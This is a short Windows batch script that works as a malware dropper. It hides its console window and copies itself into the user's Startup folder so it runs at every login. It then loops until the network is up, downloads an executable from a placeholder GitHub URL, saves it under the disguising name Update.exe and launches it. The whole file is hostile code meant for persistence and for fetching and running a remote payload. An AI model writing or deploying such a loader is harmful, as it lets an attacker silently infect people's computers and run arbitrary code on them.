@echo off
powershell.exe -windowstyle Hidden -command
title %random%
copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %temp%

:a
ping discord.com
IF %ERRORLEVEL% NEQ 0 goto a

if exist Update.exe del Update.exe
powershell -command Invoke-WebRequest https://github.com/USERNAME/REPOSITORY/raw/main/Client.exe -OutFile "Update.exe"

if exist Update.exe (
	start Update.exe
	exit
)

:else
goto a